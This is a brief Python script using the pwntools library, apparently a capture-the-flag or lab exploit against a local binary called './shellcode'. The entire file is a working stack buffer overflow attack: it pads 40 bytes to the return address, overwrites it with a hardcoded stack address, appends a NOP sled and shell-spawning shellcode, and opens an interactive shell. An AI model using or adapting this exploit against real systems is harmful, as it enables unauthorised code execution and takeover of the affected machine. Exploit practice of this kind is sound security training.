import pwn

elf = pwn.context.binary = pwn.ELF("./shellcode")
libc = elf.libc

if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path)
else:
    io = pwn.process(elf.path)

return_address_ofs = 40
shellcode = pwn.asm(pwn.shellcraft.sh())
stack_address = 0x7FFFFFFFE400

payload = b"A" * return_address_ofs
payload += pwn.p64(stack_address)
payload += b"\x90" * 256  # nop sled
payload += shellcode

io.sendline(payload)

io.interactive()
